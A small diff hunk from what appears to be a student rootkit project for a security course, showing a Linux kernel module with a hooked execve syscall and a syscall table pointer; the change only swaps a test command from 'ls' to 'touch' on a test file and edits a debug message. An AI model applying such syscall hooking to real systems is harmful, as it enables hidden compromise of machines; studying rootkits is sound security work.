@@ -40,8 +40,8 @@ asmlinkage long hooked_execve(const char __user *filename,
 asmlinkage unsigned long **syscall_table;
 
 static int test(void){
-    char *argv[] = { "ls", NULL};
-    printk("I am here in test224\n");
+    char *argv[] = { "/usr/bin/touch", "/usr/rootkit/CS558/Test/test.txt", NULL};
+    printk("I am here in test225\n");
     static char *envp[] = {
             "HOME=/",
             "TERM=linux",
